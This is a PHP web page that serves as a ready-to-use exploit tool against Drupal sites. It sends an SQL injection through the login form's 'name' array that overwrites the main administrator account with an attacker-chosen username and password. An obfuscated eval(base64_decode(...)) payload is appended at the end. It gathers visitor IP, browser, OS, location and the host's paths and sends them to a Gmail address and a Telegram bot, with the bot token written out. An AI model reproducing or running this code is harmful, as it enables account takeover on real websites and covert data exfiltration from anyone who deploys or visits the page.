<html>
<head>
    <title>Vuln!! patch it Now!</title>
    <style type="text/css">
    .mymargin{
        margin-top:100px;
        color:white;
        font-family: monospace;
    }
    body{
        background-color:black;
    }
    </style>
</head>
<body>
    <div class="mymargin">
        <center>
    <form method="GET" action="">
        Site : <input type="text" name="url" placeholder="Example: www.site.com">
        <input type="submit" name="submit" value="submit">
    </form>
    <br>
<?php
error_reporting(0);
if(isset($_GET['submit'])){

    $url = $_GET['url'];
    $post_data = "name[0;update users set name %3D 'gassrini' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status
%3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
    $params = array(
        'http' => array(
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $post_data
        )
    );
    $ctx = stream_context_create($params);
    $data = file_get_contents($url . '/user/login/', null, $ctx);
     echo "<h3>Testing at \"/user/login/</h3>\"";
    if((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data)|| (stristr($data, 'FcUk Crap') && $data)) {
        echo "Success! Log in with username \"gassrini\" and password \"admin\" at {$url}/user/login";
    } else {
        echo "Error! Either the website isn't vulnerable, or your Internet isn't working. ";
    }
}

if(isset($_GET['submit'])){

    $url = "http://".$_GET['url']."/";
    $post_data = "name[0;update users set name %3D 'gassrini' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status
%3D'1' where uid %3D '1';#]=test3&name[]=Crap&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in";
    $params = array(
        'http' => array(
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $post_data
        )
    );
    $ctx = stream_context_create($params);
    $data = file_get_contents($url . '?q=node&destination=node', null, $ctx);
     echo "<h3>Testing at \"Index</h3>\"";
    if(stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) {
        echo "Success! Log in with username \"gassrini\" and password \"admin\" at {$url}/user/login";
    } else {
        echo "Error! Either the website isn't vulnerable, or your Internet isn't working. ";
    }
};
eval(base64_decode('ZnVuY3Rpb24gWEJfT1MoJFVTRVJfQUdFTlQpew0KCSRPU19FUlJPUiAgICA9ICAgIlVua25vd24gT1MgUGxhdGZvcm0iOw0KICAgICRPUyAgPSAgIGFycmF5KCAnL3dpbmRvd3MgbnQgMTAvaScgICAgICA9PiAgJ1dpbmRvd3MgMTAnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNi4zL2knICAgICA9PiAgJ1dpbmRvd3MgOC4xJywNCgkgICAgICAgICAgICAgICAgJy93aW5kb3dzIG50IDYuMi9pJyAgICAgPT4gICdXaW5kb3dzIDgnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNi4xL2knICAgICA9PiAgJ1dpbmRvd3MgNycsDQoJICAgICAgICAgICAgICAgICcvd2luZG93cyBudCA2LjAvaScgICAgID0+ICAnV2luZG93cyBWaXN0YScsDQoJICAgICAgICAgICAgICAgICcvd2luZG93cyBudCA1LjIvaScgICAgID0+ICAnV2luZG93cyBTZXJ2ZXIgMjAwMy9YUCB4NjQnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNS4xL2knICAgICA9PiAgJ1dpbmRvd3MgWFAnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgeHAvaScgICAgICAgICA9PiAgJ1dpbmRvd3MgWFAnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNS4wL2knICAgICA9PiAgJ1dpbmRvd3MgMjAwMCcsDQoJICAgICAgICAgICAgICAgICcvd2luZG93cyBtZS9pJyAgICAgICAgID0+ICAnV2luZG93cyBNRScsDQoJICAgICAgICAgICAgICAgICcvd2luOTgvaScgICAgICAgICAgICAgID0+ICAnV2luZG93cyA5OCcsDQoJICAgICAgICAgICAgICAgICcvd2luOTUvaScgICAgICAgICAgICAgID0+ICAnV2luZG93cyA5NScsDQoJICAgICAgICAgICAgICAgICcvd2luMTYvaScgICAgICAgICAgICAgID0+ICAnV2luZG93cyAzLjExJywNCgkgICAgICAgICAgICAgICAgJy9tYWNpbnRvc2h8bWFjIG9zIHgvaScgPT4gICdNYWMgT1MgWCcsDQoJICAgICAgICAgICAgICAgICcvbWFjX3Bvd2VycGMvaScgICAgICAgID0+ICAnTWFjIE9TIDknLA0KCSAgICAgICAgICAgICAgICAnL2xpbnV4L2knICAgICAgICAgICAgICA9PiAgJ0xpbnV4JywNCgkgICAgICAgICAgICAgICAgJy91YnVudHUvaScgICAgICAgICAgICAgPT4gICdVYnVudHUnLA0KCSAgICAgICAgICAgICAgICAnL2lwaG9uZS9pJyAgICAgICAgICAgICA9PiAgJ2lQaG9uZScsDQoJICAgICAgICAgICAgICAgICcvaXBvZC9pJyAgICAgICAgICAgICAgID0+ICAnaVBvZCcsDQoJICAgICAgICAgICAgICAgICcvaXBhZC9pJyAgICAgICAgICAgICAgID0+ICAnaVBhZCcsDQoJICAgICAgICAgICAgICAgICcvYW5kcm9pZC9pJyAgICAgICAgICAgID0+ICAnQW5kcm9pZCcsDQoJICAgICAgICAgICAgICAgICcvYmxhY2tiZXJyeS9pJyAgICAgICAgID0+ICAnQmxhY2tCZXJyeScsDQoJICAgICAgICAgICAgICAgICcvd2Vib3MvaScgICAgICAgICAgICAgID0+ICAnTW9iaWxlJyk7DQogICAgZm9yZWFjaCAoJE9TIGFzICRyZWdleCA9PiAkdmFsdWUpIHsgDQogICAgICAgIGlmIChwcmVnX21hdGNoKCRyZWdleCwgJFVTRVJfQUdFTlQpKSB7DQogICAgICAgICAgICAkT1NfRVJST1IgPSAkdmFsdWU7DQogICAgICAgIH0NCg0KICAgIH0gICANCiAgICByZXR1cm4gJE9TX0VSUk9SOw0KfQ0KZnVuY3Rpb24gWEJfQnJvd3NlcigkVVNFUl9BR0VOVCl7DQoJJEJST1dTRVJfRVJST1IgICAgPSAgICJVbmtub3duIEJyb3dzZXIiOw0KICAgICRCUk9XU0VSICA9ICAgYXJyYXkoJy9tc2llL2knICAgICAgID0+ICAnSW50ZXJuZXQgRXhwbG9yZXInLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9maXJlZm94L2knICAgID0+ICAnRmlyZWZveCcsDQogICAgICAgICAgICAgICAgICAgICAgICAnL3NhZmFyaS9pJyAgICAgPT4gICdTYWZhcmknLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9jaHJvbWUvaScgICAgID0+ICAnQ2hyb21lJywNCiAgICAgICAgICAgICAgICAgICAgICAgICcvZWRnZS9pJyAgICAgICA9PiAgJ0VkZ2UnLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9vcGVyYS9pJyAgICAgID0+ICAnT3BlcmEnLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9uZXRzY2FwZS9pJyAgID0+ICAnTmV0c2NhcGUnLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9tYXh0aG9uL2knICAgID0+ICAnTWF4dGhvbicsDQogICAgICAgICAgICAgICAgICAgICAgICAnL2tvbnF1ZXJvci9pJyAgPT4gICdLb25xdWVyb3InLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9tb2JpbGUvaScgICAgID0+ICAnSGFuZGhlbGQgQnJvd3NlcicpOw0KICAgIGZvcmVhY2ggKCRCUk9XU0VSIGFzICRyZWdleCA9PiAkdmFsdWUpIHsgDQogICAgICAgIGlmIChwcmVnX21hdGNoKCRyZWdleCwgJFVTRVJfQUdFTlQpKSB7DQogICAgICAgICAgICAkQlJPV1NFUl9FUlJPUiA9ICR2YWx1ZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJEJST1dTRVJfRVJST1I7DQp9DQpkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdHTVQnKTsNCiRkYXRlID0gZGF0ZSgiZCBNLCBZIik7DQokdGltZSA9IGRhdGUoImc6aSBhIik7DQokdXNlcmFnZW50ID0gJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KJHNfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddOw0KJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107DQokSVBUWiA9IGdldGVudigiUkVNT1RFX0FERFIiKTsNCiRDT1VOVFJZVFogPSBzaW1wbGV4bWxfbG9hZF9maWxlKCJodHRwOi8vd3d3Lmdlb3BsdWdpbi5uZXQveG1sLmdwP2lwPSRJUFRaIik7DQokQ09VTlRSWSA9ICRDT1VOVFJZVFotPmdlb3BsdWdpbl9jb3VudHJ5TmFtZTsNCiRDSVRZID0gJENPVU5UUllUWi0+Z2VvcGx1Z2luX2NpdHk7DQokUkVHSU9OID0gJENPVU5UUllUWi0+Z2VvcGx1Z2luX3JlZ2lvbjsNCiRDX0NPREUgPSAkQ09VTlRSWVRaLT5nZW9wbHVnaW5fY29udHJ5Y29kZTsNCiRUaW1lem9uZSA9ICRDT1VOVFJZVFotPmdlb3BsdWdpbl90aW1lem9uZTsNCiRTeW1ib2wgPSAkQ09VTlRSWVRaLT5nZW9wbHVnaW5fY3VycmVuY3lzeW1ib2w7DQokbWVzc2FnZSAgPSAifC0tLStbTkVX44CQ8J+RqOKAjfCfkrvjgJFNL1NdKy0tLXxcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+RpOOAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4+g44CRSVAJOiAiLiRJUFRaLiJcbiI7DQokbWVzc2FnZSAuPSAi44CQ8J+Tn+OAkVN5c3RlbSA6ICIuWEJfT1MoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKS4iXG4iOw0KJG1lc3NhZ2UgLj0gIuOAkPCfjIzjgJFCcm93c2VyIDogIi5YQl9Ccm93c2VyKCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkuIlxuIjsNCiRtZXNzYWdlIC49ICLjgJDinKjjgJFVc2VyIEFnZW50IDogIi4kdXNlcmFnZW50LiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+Vte+4j+OAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4yQ44CRVGltZSBab25lIDogIi4kVGltZXpvbmUuIlxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4yQ44CRQ291bnRyeSA6ICIuJENPVU5UUlkuIlxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4yQ44CRUmVnaW9uIDogIi4kUkVHSU9OLiJcbiI7DQokbWVzc2FnZSAuPSAi44CQ8J+MkOOAkUNpdHkgOiAiLiRDSVRZLiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+Su+OAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn5GB44CRSG9zdCA6ICIuJHNfcGF0aC4iXG4iOw0KJG1lc3NhZ2UgLj0gIuOAkPCfkYDjgJFGaWxlIDogIi4keF9wYXRoLiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ4o+z44CR4pSB4pSB4pSB4pSBWytdXG4iOw0KJG1lc3NhZ2UgLj0gIuOAkOKMmu+4j+OAkVRpbWUJOiAiLiR0aW1lLiJcbiI7DQokbWVzc2FnZSAuPSAi44CQ8J+TheOAkURhdGUJOiAiLiRkYXRlLiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+UjeOAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn5Oh44CRVHJhY2sgSVAgOiBodHRwczovL3d3dy5pcC10cmFja2VyLm9yZy9sb29rdXAucGhwP2lwPSIuJElQVFouIlxuIjsNCiRtZXNzYWdlIC49ICJ8PT09K1vwn5KWQkMuRFLwn5KWXSs9PT18XG4iOw0KJHJlY2VpdmVyQWRkcmVzcyA9ICJrYWxpeDB4YWxpa0BnbWFpbC5jb20iOw0KJFRPS0VOID0gIjUyNjg0MDE5OTM6QUFFMVA0YzVQSGVSQ1RHY2EwTEtaSVd6bS15eVllM1ljQzQiOw0KJENIQVRfSUQgPSAiMTg5NjQ2NDI5NSI7DQokc3ViamVjdCAgPSAi8J+Slk5ld/CfkaRbTS9TXfCfkaR88J+MkEZyMG06Ii4kSVBUWi4i8J+SliI7DQptYWlsKCRyZWNlaXZlckFkZHJlc3MsJHN1YmplY3QsJG1lc3NhZ2UpOw0KZmlsZV9nZXRfY29udGVudHMoImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiLiRUT0tFTi4iL3NlbmRNZXNzYWdlP2NoYXRfaWQ9Ii4kQ0hBVF9JRC4iJnRleHQ9IiAuIHVybGVuY29kZSgkbWVzc2FnZSkuIiIgKTs'));?>
    </div>

</body>
</html>
